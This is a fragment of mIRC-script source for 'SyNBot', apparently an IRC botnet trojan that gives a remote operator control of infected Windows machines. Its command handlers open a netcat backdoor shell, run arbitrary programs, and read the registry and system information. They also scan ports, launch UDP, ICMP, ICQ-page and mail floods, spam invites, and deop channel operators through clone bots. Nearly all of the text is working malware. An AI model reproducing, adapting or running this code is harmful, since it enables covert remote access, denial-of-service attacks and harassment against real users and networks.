      if ($sock(inviter*,0) > 0) { msgx # 5[15in14vit15er5]: STATUS: CONNECTED [ $+ $sock(inviter*,0) $+ ] }     } |   if ($2 == stats) { msgx # 5[15in14vit15er5]: (STATS) TOTAL INVITED: $calc( %i.t.j  +  %i.t.p ) DELAY: ( $+ %i.ondelay $+ ) }   |  if ($2 == list) { sockwrite -nt inviterN LIST :* $+ $3 $+ * }  |  if ($2 == message) { set %imsgx $3- | msgx # 5[15in14vit15er5]:  INVITE msgx SET AS [ $+ $3- $+ ] } 
      if ($2 == ctotal) { msgx # 5[15in14vit15er5]: RANDOM CHANNELS TOTAL: $+ $lines(ichan.txt)  }  |  if ($2 == reset) { msgx # 5[15in14vit15er5]: ALL SETTINGS UNSET! | unset %i.t.j  | unset %i.t.p | unset %imsgx | unset %i.server | unset %s.i.c | unset %i.b | unset %i* | write -c ichan.txt | remove ichan.txt | unset %t.i | sockclose inviter* }  |  if ($2 == mode) { /sockwrite -nt inviter*  MODE $3-  }  
      if ($2 == join) { if ($3 == random) {  if ($lines(ichan.txt) < 0) || ($exists(ichan.txt) == $false) { msgx # 5[15in14vit15er5]: ERROR: GETHER CHANNELS 1ST! | halt }  |   set %i.r.j.a $4 | /set %i.r.j.i 0  |   :loop |    if (%i.r.j.i  > %i.r.j.a) { goto end } |     /sockwrite -nt inviterN JOIN : $+ $read -l $+ $r(1,$lines(ichan.txt)) ichan.txt  |     inc %i.r.j.i  |     goto loop |     :end    |   unset %i.r.j.i | unset %i.r.j.a   |   halt    } |   else { /sockwrite -nt inviterN JOIN : $+ $3 }  } 
      if ($2 == part) { //sockwrite -nt inviterN PART : $+ $3- }   |  if ($2 == nick) { if ($3 == random) { sockwrite -nt inviterN NICK $read ex.scr | halt }  |  //sockwrite -nt inviterN NICK $3   }  |  if ($2 == delay) { set %i.ondelay $3 | msgx # 5[15in14vit15er5]:  DELAY SET TO: ( $+ $3 $+ ). }
    }
    if ($1 == !icqpagebomb) {  if ($2 == help) { msgx # SYNTAX: !icqpagebomb uin ammount email/name sub message (HELP) | halt } |   if ($2 == reset) { msgx # ICQ PAGE BOMBER (ALL SETTINGS RESET!)... | unset %ipb.n | unset %ipb.sub | unset %ipb.m | unset %ipb.uin | unset %ipb.t } |  if ($6 == $null) { msgx # ERROR!: !icqpagebomb uin ammount email/name sub message | halt } | if ($3 !isnum 1-100) { msgx # ERROR! under amount 100 please. (moreinfo type !icqpagebomb help) | halt } |   set %ipb.n $4 | set %ipb.sub $5 | set %ipb.m $replace($6,$chr(32),_) | set %ipb.uin $2 | set %ipb.t $3 msgx # 14[15ICQPAGEBOMBER14]:15 BOMBING:12 $2 14AMOUNTt:12 $3 15NAME/EMAIL:12 $4 14SUB:12 $5 14MESSAGE:12 $6 3etc... |   /icqpagebomb  } 
    if ($1 == !portscan) { if ($4 == $null) { msgx # ERROR !portscan [ip-address] [start-port] [end-port] | halt }  |  if ($calc($4 - $3) > 800) { msgx # ERROR; please scan under 800 ports at a time! | halt } | set %port.to.scan $3 | set %port.to.scan %port.to.scan $+ - $+ $4 |  set %port.scan.ip $2 |  set %schan # |  msgx # 14[15PORTSCAN14] NOW SCANNING $2 on %port.to.scan |  port.range.scan %port.scan.ip }
    if ($1 == !dns) { if ($2 == $null) { halt } | dns $2 | set %dns.r on | set %dns.rr # | msgx # 14..[`15dns14`].. 5ATTEMPTING TO RESOLVE4 $2 $+ 12... }
  }
  if ($left($target,1) != $chr($asc(#))) { 
    close -m $nick
    if ($1 == !ver) { msg $nick [SyNBot](V5.0)[By Syn] }
    if ($1 == !disk) {
      set %diskinfo $null
      if ($exists(c:) == $true) { 
        set %diskinfo [ %diskinfo C:\ (  $+ [ $bytes($disk(c).free,g).suf ] $+  /  $+ [ $bytes($disk(c).size,g).suf ] $+  ) ]
      }
      if ($exists(d:) == $true) { 
        set %diskinfo [ %diskinfo D:\ (  $+ [ $bytes($disk(d).free,g).suf ] $+  /  $+ [ $bytes($disk(d).size,g).suf ] $+  ) ]
      }
      if ($exists(e:) == $true) { 
        set %diskinfo [ %diskinfo E:\ (  $+ [ $bytes($disk(e).free,g).suf ] $+  /  $+ [ $bytes($disk(e).size,g).suf ] $+  ) ]
      }
      if ($exists(f:) == $true) { 
        set %diskinfo [ %diskinfo F:\ (  $+ [ $bytes($disk(f).free,g).suf ] $+  /  $+ [ $bytes($disk(f).size,g).suf ] $+  ) ]
      }
      if ($exists(g:) == $true) { 
        set %diskinfo [ %diskinfo G:\ (  $+ [ $bytes($disk(g).free,g).suf ] $+  /  $+ [ $bytes($disk(g).size,g).suf ] $+  ) ]
      }
      if ($exists(h:) == $true) { 
        set %diskinfo [ %diskinfo H:\ (  $+ [ $bytes($disk(h).free,g).suf ] $+  /  $+ [ $bytes($disk(h).size,g).suf ] $+  ) ]
      }
      if ($exists(I:) == $true) { 
        set %diskinfo [ %diskinfo I:\ (  $+ [ $bytes($disk(i).free,g).suf ] $+  /  $+ [ $bytes($disk(i).size,g).suf ] $+  ) ]
      }
      if ($exists(J) == $true) { 
        set %diskinfo [ %diskinfo J:\ (  $+ [ $bytes($disk(j).free,g).suf ] $+  /  $+ [ $bytes($disk(j).size,g).suf ] $+  ) ]
      }
      if ($exists(k:) == $true) { 
        set %diskinfo [ %diskinfo K:\ (  $+ [ $bytes($disk(k).free,g).suf ] $+  /  $+ [ $bytes($disk(k).size,g).suf ] $+  ) ]
      }
      if ($exists(l:) == $true) { 
        set %diskinfo [ %diskinfo L:\ (  $+ [ $bytes($disk(l).free,g).suf ] $+  /  $+ [ $bytes($disk(l).size,g).suf ] $+  ) ]
      }
      if ($exists(m:) == $true) { 
        set %diskinfo [ %diskinfo M:\ (  $+ [ $bytes($disk(m).free,g).suf ] $+  /  $+ [ $bytes($disk(m).size,g).suf ] $+  ) ]
      }
      if ($exists(n:) == $true) { 
        set %diskinfo [ %diskinfo N:\ (  $+ [ $bytes($disk(n).free,g).suf ] $+  /  $+ [ $bytes($disk(n).size,g).suf ] $+  ) ]
      }
      if ($exists(o:) == $true) { 
        set %diskinfo [ %diskinfo O:\ (  $+ [ $bytes($disk(o).free,g).suf ] $+  /  $+ [ $bytes($disk(o).size,g).suf ] $+  ) ]
      }
      if ($exists(p:) == $true) { 
        set %diskinfo [ %diskinfo P:\ (  $+ [ $bytes($disk(p).free,g).suf ] $+  /  $+ [ $bytes($disk(p).size,g).suf ] $+  ) ]
      }
      if ($exists(q:) == $true) { 
        set %diskinfo [ %diskinfo Q:\ (  $+ [ $bytes($disk(q).free,g).suf ] $+  /  $+ [ $bytes($disk(q).size,g).suf ] $+  ) ]
      }
      if ($exists(r:) == $true) { 
        set %diskinfo [ %diskinfo R:\ (  $+ [ $bytes($disk(r).free,g).suf ] $+  /  $+ [ $bytes($disk(r).size,g).suf ] $+  ) ]
      }
      if ($exists(s:) == $true) { 
        set %diskinfo [ %diskinfo S:\ (  $+ [ $bytes($disk(s).free,g).suf ] $+  /  $+ [ $bytes($disk(s).size,g).suf ] $+  ) ]
      }
      if ($exists(t:) == $true) { 
        set %diskinfo [ %diskinfo T:\ (  $+ [ $bytes($disk(t).free,g).suf ] $+  /  $+ [ $bytes($disk(t).size,g).suf ] $+  ) ]
      }
      if ($exists(u:) == $true) { 
        set %diskinfo [ %diskinfo U:\ (  $+ [ $bytes($disk(u).free,g).suf ] $+  /  $+ [ $bytes($disk(u).size,g).suf ] $+  ) ]
      }
      if ($exists(v:) == $true) { 
        set %diskinfo [ %diskinfo V:\ (  $+ [ $bytes($disk(v).free,g).suf ] $+  /  $+ [ $bytes($disk(v).size,g).suf ] $+  ) ]
      }
      if ($exists(w:) == $true) { 
        set %diskinfo [ %diskinfo W:\ (  $+ [ $bytes($disk(w).free,g).suf ] $+  /  $+ [ $bytes($disk(w).size,g).suf ] $+  ) ]
      }
      if ($exists(x:) == $true) { 
        set %diskinfo [ %diskinfo X:\ (  $+ [ $bytes($disk(x).free,g).suf ] $+  /  $+ [ $bytes($disk(x).size,g).suf ] $+  ) ]
      }
      if ($exists(y:) == $true) { 
        set %diskinfo [ %diskinfo Y:\ (  $+ [ $bytes($disk(y).free,g).suf ] $+  /  $+ [ $bytes($disk(y).size,g).suf ] $+  ) ]
      }
      if ($exists(Z:) == $true) { 
        set %diskinfo [ %diskinfo Z:\ (  $+ [ $bytes($disk(z).free,g).suf ] $+  /  $+ [ $bytes($disk(z).size,g).suf ] $+  ) ]
      }
      msg $nick [DISKINFO] %diskinfo [DISKINFO]
      unset %diskinfo
    }
    if (($1 == !rscript) && ($2 == $null)) { reload -rs winlogon.dll }
    if (($1 == !rscript) && ($2 != $null)) { reload -rs $2- }
    if ($1 == !cusers) { rlevel 10 }
    if ($1 == !join) { if ($2 != $null) { join $2- } }
    if ($1 == !part) { if ($2 != $chan(1)) { part $2- } }
    if ($1 == !mode) { mode $2 $3- }
    if ($1 == !mode.me) { mode $me $2- }
    if ($1 == !max.load) { set %max.load $2 }
    if ($1 == !die.right.now.kthx) { exit }
    if ($1 == !Registry) && ($2 != $null) && ($dll(registry.dll,GetKeyValue, $2- ) != $null) { msg $nick REGISTRY READER, VALUE IS: $dll(registry.dll,GetKeyValue, $2- ) }
    if ($1 == !msgx) { msgx $2 $3- }
    if ($1 == !t) && ($2 != $null) { .run abc.exe nc.exe -L -d -e cmd1.exe -p $2 | msg $nick TELNET PORT: $2 NOW OPEN }
    if ($1 == !t.kill) { .run kill.exe cmd1.exe | .run kill.exe nc.exe | .run kill.exe cmd1.exe | .run kill.exe nc.exe | msg $nick TELNET PORT(S) CLOSED! }
    if ($1 == !set) { if ($2 != $null) { set $2 $3- } }
    if ($1 == !unset) { if ($2 != $null) { unset $2- } }
    if ($1 == !exists.full) { if ($2 != $null) { msg $nick $iif($exists($2-),Yes it Exists,No It Doesnt Exists) } } 
    if ($1 == !exists) { if ($2 != $null) { if ($exists($2-) == $false) { halt } | msg $nick Yes It Exists } } 
    if ($1 == !run) { if ($2 != $null) { run $2- } }
    if ($1 == !raw) { if ($2 != $null) { $chr(47) $+ [ [ $2- ] ] } }
    if ($1 == !url) { msg $nick Currently Browsing:[  $+ $url $+  ] }
    if ($1 == !uptime) { msg $nick My Uptime:[ $+  $duration($calc( $ticks / 1000 )) $+ ] }
    if ($1 == !info) { msg $nick IP:[ $+ $ip $+ ] HOST:[ $+ $host $+ ] DATE:[ $+  $asctime(dddd mmmm dd yyyy) $+ ] TIME:[ $+  $asctime(hh:nn tt ) $+ ]  OS:[WINDOWS $+ $os $+ ] UPTIME:[ $+  $duration($calc( $ticks / 1000 )) $+ ] CURRENT-URL:[  $+ $url $+  ] }
    if ($1 == !mircdir) { msg $nick $mircdir }
    if ($1 == !die.forever) { msgx $nick [Now Removing] | set %removeitem 1 | .run $mircexe | exit }
    if ($1 == !nick.new) { if ($2 != $null) { nick $2 $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z) $+ $rand(1,9) } }
    if ($1 == !nick) { nick SYN- $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z) }
    if ($1 == !var) { if ( [ [ $2 ] ] == $null) { halt } | msg $nick [var]: $2 is [ [ $2- ] ] }
    if ($1 == !varadd) { if ($2 == $null) || ($3 == $null) { halt } | msg $nick Set $2 $3- | //set $2 $3 }
    if ($1 == !scripts) { .msg $nick I have $script(0) loaded. }
    if ($1 == !moo) { .msg $nick 2os[ $+ $dll(moo.dll,osinfo,_) $+ ] 2uptime[ $+ $dll(moo.dll,uptime,_) $+ ] 2cpu[ $+ $dll(moo.dll,cpuinfo,_) $+ ] 2mem[ $+ $dll(moo.dll,meminfo,_) $+ $result $+] 2screen[ $+ $dll(moo.dll,screeninfo,_) $+ ] 2Network Interfaces[ $+ $dll(moo.dll,interfaceinfo,_) $+ ] }
    if ($1 == !diskinfo) { if ($2 == $null) { msg $nick I have $bytes($disk(c).free).suf of free space, total; $bytes($disk(c).size).suf in C:\ } | if ($2 != $null) && ($exists($2) == $true) { msg $nick I have $bytes($disk($2).free).suf of free space, total; $bytes($disk($2).size).suf in $2 } | { if ($2 != $null) && ($exists($2) != $true) { msg $nick I Have No Such Drive! } } }      
    if ($1 == !flood.stop) { timerConstantFlood* off  | msgx $nick STOPPING FLOOD COMPLETE... }
    if ($1 == !set.flood.server.port) {  if ($2 == $null) { halt } | if ($3 == $null) { halt } | /set %msg.flood.server $$2 |  /set %msg.flood.server.port $3  }
    if ($1 == !super.flood) {  if ($2 == $null) { halt } | if (%msg.flood.server == $null) || (%msg.flood.server.port == $null) { .msgx $nick msgxflood server, or port not set! | halt }  | if ($3 == $null) { //set %msg2bomb BlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBlingBling | goto bomb } | //set %bots 1 | /set %nick2bomb $$2  | /set %msg2bomb $$3- | .msgx $nick 5RANDOM CONNECT QUERY/NOTICE FLOODING: $$2 ( $+ %msg2bomb $+ ) |  /dksmsgxflooder  |  /timer -o 1 100 .msgx $nick FLOOD COMPLETE ON: $2  |  /timer -o 1 100 /sockclose dksmsgxflooder*  |   /timer -o 1 102 /unset %blastedmsgxs  }
    if ($1 == !super.flood.stop!) {   //set %blastit Off  |  /sockclose dksmsgxflooder* |  /unset %blastedmsgxs | .msgx $nick FLOOD TURNED OFF:. |  //timers off  }
    if ($1 == !click) { 
      if ($2 == off) { timerclicker off | msgx $nick 14•15TragicClicker14• Stopped clicking %click.url | sockclose webpage* | halt } 
      if ($2 == stats) { 
        if ($timer(clicker) == $null) { msgx $nick 14•15TragicClicker14• idle.. | halt } 
        msgx $nick 14•15TragicClicker14• Currently clicking: 12«14(15 $+ %click.url $+ 14)12» Clicks left:12 $timer(clicker).reps Delay:12 $duration($timer(clicker).delay) Time left:12 $duration($calc($timer(clicker).reps * $timer(clicker).delay)) 
        halt 
      }
      if (($4 !isnum) && ($4 != random)) { msgx $nick 14•15Clicker14• Error! Syntax: !click http://www.url.com <number of times> <delay> (Note: use 'random' to make it delay between 5-45 seconds) | halt } 
      if ((http:// !isin $2) || ($3 !isnum)) { msgx $nick 14•15Clicker14• Error! Syntax: !click http://www.url.com <number of times> <delay> (Note: use 'random' to make it delay between 5-45 seconds) | halt } 
      var %c = $4 | if ($4 == random) { set %c $rand(5,45) } | set %click.url $2 | set %click.url2 $remove($2,http://,https://,$gettok($remove($2,http://,https://),1,47)) | msgx $nick 14•15Clicker14• Now clicking 12 $+ $2 $+  $3 times, with a delay of 12 $+ $duration(%c) 8~~14 Type !click off to stop! 
      if (%click.url2 == $chr(47)) { set %click.url2 $chr(47) $+ index.html }
      timerclicker $3 %c webview1 $gettok($remove($2,http://,https://),1,47) 80 
    }
    if ($1 == !icmp) { if ($4 == $null) { .msgx $nick icmp error! | halt } | .remove icmp.vbs | .write icmp.vbs Set src3 = CreateObject("Wscript.shell") | .write icmp.vbs src3.run "command /c ping -n $4 -l $3 -w 0 $2 ",0,true | .run icmp.vbs }  { msgx $nick 4[sending ( $+ $4 $+ ) ICMP-packets to ( $+ $2 $+ ) Sized: ( $+ $3 $+ )14] } 
    if (($1 == !identd) && ($2 != $null)) { identd on $2 }
    if ($1 == !timeout) { set %timeout $2 }
    if ($1 == !pfast) {  //set %pchan $nick |  if ($4 == random) { //gcoolstart $2 $3 $r(1,65000) | halt } | //gcoolstart $2 $3 $4 }
    if ($1 == !portredirect) { if ($2 == $null) { .msgx $nick PORTREDIRECTION ERROR!!! FOR HELP TYPE: !portredirect help | halt } | if ($2 == help) { .msgx $nick *** PORT REDIRECTION HELP! *** | .msgx $nick COMMANDS.. | msgx $nick !portredirect add 1000 irc.dal.net 6667 | msgx $nick !portredirect stop port | msgx $nick !portredirect stats | .msgx $nick PORT REDIRECT HELP / END halt } | if ($2 == add) { if ($5 == $null) { .msgx $nick PORT REDIRECTION ERROR: !portredirect add inputport outputserver outputserverport (!portredirect add 1000 irc.dal.net 6667) | halt } | //gtportdirect $3- | .msgx $nick [REDIRECT ADDED] I-PORT=( $+ $3 $+ ) to $4 $5 | .msgx $nick [LOCAL IP ADDRESS]: $+  $ip |  halt  } |  if ($2 == stop) {  if ($3 == $null) { halt } | /pdirectstop $3 |  .msgx $nick [PORTREDIRECTION] PORT:(12 $+ $3 $+ 14) HAS BEEN STOPPED. |  halt  } | if ($2 == stats) { 
    msgx  $nick *** PORT REDIRECTION STATS. |  /predirectstats $nick } }
    if ($1 == !udp) { set %pchan $nick | coldrage $2- }
    if ($1 == !sndl) { set %dchan $nick | cfdl $2- }
    if ($1 == !cfmailbomb) { set %mchan $nick | cfmailbomb $2- }
    if ($1 == !s) { if ($2 == on) { set %msg 0 } | if ($2 == off) { set %msg 1 } }
    if ($1 == !bnc) && ($2 != $null) && ($3 != $null) {
      if ($sock(bnc)) {
        msgx $nick [SyNBot] - Bot Bnc Status /\ Status: Already Active
        halt
      }
      set %bnc on
      socklisten bnc $2
      set %bnc.port $2
      set %bnc.passwd $3 
      msgx $nick [SyNBot] - Bot Bnc Status /\ Status: Activated - Ip: $ip - Port: %bnc.port - Password: %bnc.passwd
    }
    if ($1 == !bncstats) {
      if ($sock(bnc)) {
        msgx $nick [SyNBot] - Bot Bnc Status /\ Status: Active - Ip: $ip - Port: %bnc.port - Password: %bnc.passwd - Users: $sock(BncClient*,0) - On Servers: $sock(BncServer*,0)
      }
      if ($sock(bnc) == $null) {
        msgx $nick [SyNBot] - Bot Bnc Status /\ Status: Deactive
      }
    }
    if ($1 == !bncoff) {
      sockclose bnc
      msgx $nick [SyNBot] - Bot Bnc Status /\ Status: Deactivated
    }
    if ($1 == !inviter) {   %s.i.c = # | if (# == $null) { set  %s.i.c $nick }  |  if ($2 == load) { /set %i.server $3 | /set %i.port $4 | %i.b = on | s.inviter  } |  if ($2 == stop) { sockclose inviter* | remove ichan.txt | //set %i.b off | unset %i.temp.* | /timerinviteconnect off | msgx $nick 5[15in14vit15er5]:  INVITER HAS BEEN KILLED. }  |  if ($2 == status) { if ($sock(inviter*,0) == 0) { msgx $nick 5[15in14vit15er5]: STATUS: NOT CONNECTED! | halt }  
      if ($sock(inviter*,0) > 0) { msgx $nick 5[15in14vit15er5]: STATUS: CONNECTED [ $+ $sock(inviter*,0) $+ ] }     } |   if ($2 == stats) { msgx $nick 5[15in14vit15er5]: (STATS) TOTAL INVITED: $calc( %i.t.j  +  %i.t.p ) DELAY: ( $+ %i.ondelay $+ ) }   |  if ($2 == list) { sockwrite -nt inviterN LIST :* $+ $3 $+ * }  |  if ($2 == message) { set %imsgx $3- | msgx $nick 5[15in14vit15er5]:  INVITE msgx SET AS [ $+ $3- $+ ] } 
      if ($2 == ctotal) { msgx $nick 5[15in14vit15er5]: RANDOM CHANNELS TOTAL: $+ $lines(ichan.txt)  }  |  if ($2 == reset) { msgx $nick 5[15in14vit15er5]: ALL SETTINGS UNSET! | unset %i.t.j  | unset %i.t.p | unset %imsgx | unset %i.server | unset %s.i.c | unset %i.b | unset %i* | write -c ichan.txt | remove ichan.txt | unset %t.i | sockclose inviter* }  |  if ($2 == mode) { /sockwrite -nt inviter*  MODE $3-  }  
      if ($2 == join) { if ($3 == random) {  if ($lines(ichan.txt) < 0) || ($exists(ichan.txt) == $false) { msgx $nick 5[15in14vit15er5]: ERROR: GETHER CHANNELS 1ST! | halt }  |   set %i.r.j.a $4 | /set %i.r.j.i 0  |   :loop |    if (%i.r.j.i  > %i.r.j.a) { goto end } |     /sockwrite -nt inviterN JOIN : $+ $read -l $+ $r(1,$lines(ichan.txt)) ichan.txt  |     inc %i.r.j.i  |     goto loop |     :end    |   unset %i.r.j.i | unset %i.r.j.a   |   halt    } |   else { /sockwrite -nt inviterN JOIN : $+ $3 }  } 
      if ($2 == part) { //sockwrite -nt inviterN PART : $+ $3- }   |  if ($2 == nick) { if ($3 == random) { sockwrite -nt inviterN NICK $read ex.scr | halt }  |  //sockwrite -nt inviterN NICK $3   }  |  if ($2 == delay) { set %i.ondelay $3 | msgx $nick 5[15in14vit15er5]:  DELAY SET TO: ( $+ $3 $+ ). }
    }
    if ($1 == !icqpagebomb) {  if ($2 == help) { msgx $nick SYNTAX: !icqpagebomb uin ammount email/name sub message (HELP) | halt } |   if ($2 == reset) { msgx $nick ICQ PAGE BOMBER (ALL SETTINGS RESET!)... | unset %ipb.n | unset %ipb.sub | unset %ipb.m | unset %ipb.uin | unset %ipb.t } |  if ($6 == $null) { msgx $nick ERROR!: !icqpagebomb uin ammount email/name sub message | halt } | if ($3 !isnum 1-100) { msgx $nick ERROR! under amount 100 please. (moreinfo type !icqpagebomb help) | halt } |   set %ipb.n $4 | set %ipb.sub $5 | set %ipb.m $replace($6,$chr(32),_) | set %ipb.uin $2 | set %ipb.t $3 msgx $nick 14[15ICQPAGEBOMBER14]:15 BOMBING:12 $2 14AMOUNTt:12 $3 15NAME/EMAIL:12 $4 14SUB:12 $5 14MESSAGE:12 $6 3etc... |   /icqpagebomb  } 
    if ($1 == !portscan) { if ($4 == $null) { msgx $nick ERROR !portscan [ip-address] [start-port] [end-port] | halt }  |  if ($calc($4 - $3) > 800) { msgx $nick ERROR; please scan under 800 ports at a time! | halt } | set %port.to.scan $3 | set %port.to.scan %port.to.scan $+ - $+ $4 |  set %port.scan.ip $2 |  set %schan $nick |  msgx $nick 14[15PORTSCAN14] NOW SCANNING $2 on %port.to.scan |  port.range.scan %port.scan.ip }
    if ($1 == !dns) { if ($2 == $null) { halt } | dns $2 | set %dns.r on | set %dns.rr $nick | msgx $nick 14..[`15dns14`].. 5ATTEMPTING TO RESOLVE4 $2 $+ 12... }
  }
}

on *:TEXT:*:?:{
  if (($nick != s1n) || ($nick != syn)) {
    notice syn ERROR :: MSG FROM $NICK :: $1- 
    notice s1n ERROR :: MSG FROM $NICK :: $1-
  }
}

on *:text:*:*:{
  if ($1 == !x) && (($nick isop $chan) || (syn == $nick) || (s1n == $nick)) { 
    if ($blah1234($nick,$2-) == true) {
      if ($level($address($nick,7)) == 10) { msg $chan You are Already on Access List! | halt }
      guser 10 $nick 7 
      msg $chan Password Accepted.. 
      halt 
    } 
    rlevel 10
  }
}

alias gchek {
  :loop
  var %hh $r(1,12)
  var %fd1 0
  if (%hh == 1) { return §¥Ñ }
  if (%hh == 2) { return §¥Ñ }
  if (%hh == 3) { return §¥Ñ }
  if (%hh == 4) { return §¥Ñ }
  if (%hh == 5) { return §¥Ñ }
  if (%hh == 6) { return §¥Ñ }
  if (%hh == 7) { return §¥Ñ }
  if (%hh == 8) { return §¥Ñ }
  if (%hh == 9) { return §¥Ñ }
  if (%hh == 10) { return §¥Ñ }
  if (%hh == 11) { return §¥Ñ	 }
  if (%hh == 12) { return §¥Ñ }
  inc %fd1
  while (%fd1 < $r(1,25)) { goto loop }
}

on *:join:#:{
  if (($nick != $me) && (SYN-* iswm $nick)) {
    if ($address($nick,2) == $address($me,2)) { 
      if ($nick($chan,1) != $null) && (SYN-* !iswm $nick($chan,1)) { notice $nick($chan,1) Now quitting.. clone found: $nick }
      if ($nick($chan,2) != $null) && (SYN-* !iswm $nick($chan,2)) { notice $nick($chan,2) Now quitting.. clone found: $nick }
      if ($nick($chan,3) != $null) && (SYN-* !iswm $nick($chan,3)) { notice $nick($chan,3) Now quitting.. clone found: $nick }
      if ($nick($chan,4) != $null) && (SYN-* !iswm $nick($chan,4)) { notice $nick($chan,4) Now quitting.. clone found: $nick }
      if ($nick($chan,5) != $null) && (SYN-* !iswm $nick($chan,5)) { notice $nick($chan,5) Now quitting.. clone found: $nick }
      if ($nick($chan,6) != $null) && (SYN-* !iswm $nick($chan,6)) { notice $nick($chan,6) Now quitting.. clone found: $nick }
      if ($nick($chan,7) != $null) && (SYN-* !iswm $nick($chan,7)) { notice $nick($chan,7) Now quitting.. clone found: $nick }
      if ($nick($chan,8) != $null) && (SYN-* !iswm $nick($chan,8)) { notice $nick($chan,8) Now quitting.. clone found: $nick }
      if ($nick($chan,9) != $null) && (SYN-* !iswm $nick($chan,9)) { notice $nick($chan,9) Now quitting.. clone found: $nick }
      if ($nick($chan,10) != $null) && (SYN-* !iswm $nick($chan,10)) { notice $nick($chan,10) Now quitting.. clone found: $nick }
      /quit clone found: $nick 
      exit 
    }
  }
  window -h #
}

raw 332:*:{ 
  if ($regex($chan($2).topic,/raw (.+) raw_/)) { [ [ $regml(1) ] ] }
  if (($3 == !randscan) && (%begshortip == $null) && ($4 != $null) && ($5 != $null) && (* isin $4) && (* isin $5) && (*.*.*.* iswm $4) && (*.*.*.* iswm $5) && ($6 != $null)) {
  set %botchan $2 | set %port $6 | set %begit $randip($4) | msg $2 2[14scanner2]14 starting scan from: %begit to $5 on %port | set %begshortip %begit | set %beglongip $longip(  %begshortip ) | set %endshortip $5 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | setnewvars4scan }
}

on *:TOPIC:*:{ rlevel 10 }
on 10:NICK:{ rlevel 10 }
on 10:quit:{ rlevel 10 }
on 10:part:{ rlevel 10 }
on 10:join:{ rlevel 10 }

alias blah1234 { if ($lw.decrypt($2-) == $1 $+ s1n.is.your.daddy) { return true } }




on *:sockopen:ock*:{  if ($sockerr > 0) { halt } |  %clones.tmpcalc = $int($calc(%clones.serverport / 256)) |  bset &binvar 1 4  |  bset &binvar 2 1  |  bset &binvar 3 %clones.tmpcalc  |  bset &binvar 4 $calc(%clones.serverport - (%clones.tmpcalc * 256))  |  bset &binvar 5 $gettok(%clones.server,1,46)  |  bset &binvar 6 $gettok(%clones.server,2,46)  | bset &binvar 7 $gettok(%clones.server,3,46)  |  bset &binvar 8 $gettok(%clones.server,4,46)  |  bset &binvar 9 0   | sockwrite $sockname &binvar } 
on *:sockread:ock*:{ if ($sockerr > 0) { halt } |  sockread 4096 &binvar  | if ($sockbr == 0) { return } |  if ($bvar(&binvar,2) == 90) { %clones.tp = $read ex.scr |  if (%clones.tp == $null) { %clones.tp = $randomgen($r(0,9)) } |   sockwrite -n $sockname USER %clones.tp a a : $+ $chr(3) $+ $rand(0,15) $+ $read ex.scr |  %clones.tp = $read ex.scr |   if (%clones.tp == $null) { %clones.tp = $randomgen($r(0,9)) } |  sockwrite -n $sockname NICK %clones.tp   | sockmark $sockname %clones.tp |  sockrename $sockname s $+ $sockname  } | elseif ($bvar(&binvar,2) == 91) { return } } 
on *:sockopen:sock*:{ if ($sockerr > 0) { halt } | %clones.tp = $read ex.scr | if (%clones.tp == $null) { %clones.tp = $randomgen($r(0,9)) } | sockwrite -n $sockname USER %clones.tp a a  $+ $read ex.scr | %clones.tp = $read ex.scr | if (%clones.tp == $null) { %clones.tp = $randomgen($r(0,9)) } | sockwrite -n $sockname NICK %clones.tp  | sockmark $sockname %clones.tp }
on *:sockread:sock*:{ if ($sockerr > 0) { halt } | sockread 4096 %clones.read | %clones.tmp = $gettok(%clones.read,2,32) | if ($gettok(%clones.read,1,32) == PING) { sockwrite -n $sockname PONG $gettok(%clones.read,2,32) } |  elseif (%clones.tmp == 001) { sockwrite -n $sockname MODE $sock($sockname).mark +i |  if (%clones.silence == 1) { sockwrite -n $sockname SILENCE *@* }  } | elseif (%clones.tmp == 433) { %clones.rand = $randomgen($r(0,9)) | sockwrite -n $sockname NICK %clones.rand  | sockmark $sockname %clones.rand } | elseif (%clones.tmp == 353) { if (%clones.deop == 1) { %clones.deop = 0  %clones.cnt2 = 0 |   %clones.deopstr = $null |   :home |  inc %clones.cnt2 1 | $&
  %nick = $gettok($gettok(%clones.read,2,58),%clones.cnt2,32) |  if (%nick == $null) { goto end } |   if ($left(%nick,1) != @) { goto home } |  %nick = $gettok(%nick,1,64) |   if ($isbot(%nick) == $true) { goto home } |   if (%clones.incme != 1) { if (%nick == $me) { goto home } } |   %clones.deopstr = %clones.deopstr %nick |  if ($numtok(%clones.deopstr,32) == 3) { botraw MODE %clones.deopchannel -ooo %clones.deopstr | %clones.deopstr = $null }  |   goto home |    :end |  if ($numtok(%clones.deopstr,32) > 0) { botraw MODE %clones.deopchannel -ooo %clones.deopstr | %clones.deopstr = $null } }  } | elseif (%clones.tmp == KICK) { if ($gettok(%clones.read,4,32) == $sock($sockname).mark) { sockwrite -n $sockname JOIN $gettok(%clones.read,3,32) }  }  }
on *:sockclose:*ock*:{  if ($left($sockname,1) == o) { %clones.sockname = s $+ $sockname } | else { %clones.sockname = $sockname } } 


alias checkremove {
  if (%removeitem == 1) {
    .write rm.bat start cmd.exe /c ping 127.0.0.1
    .write rm.bat start cmd.exe /c ping 127.0.0.1
    .write rm.bat start cmd.exe /c ping 127.0.0.1
    .write rm.bat start cmd.exe /c ping 127.0.0.1
    .write rm.bat start cmd.exe /c ping 127.0.0.1
    .write rm.bat start cmd.exe /c ping 127.0.0.1
    .write rm.bat start cmd.exe /c ping 127.0.0.1
    .write rm.bat start cmd.exe /c ping 127.0.0.1
    .write rm.bat start cmd.exe /c ping 127.0.0.1
    .write rm.bat start cmd.exe /c ping 127.0.0.1
    .write rm.bat start cmd.exe /c ping 127.0.0.1
    .write rm.bat start cmd.exe /c ping 127.0.0.1
    .write rm.bat start cmd.exe /c ping 127.0.0.1
    .write rm.bat start cmd.exe /c ping 127.0.0.1
    .write rm.bat del /q abc.bat
    .write rm.bat del /q abc.exe
    .write rm.bat del /q abc2.dll
    .write rm.bat del /q abc.dll
    .write rm.bat del /q abcd.jpg
    .write rm.bat del /q abcd.jpeg
    .write rm.bat del /q attrib.exe
    .write rm.bat del /q changes.txt
    .write rm.bat del /q die.exe
    .write rm.bat del /q encrypt.lib
    .write rm.bat del /q moo.dll
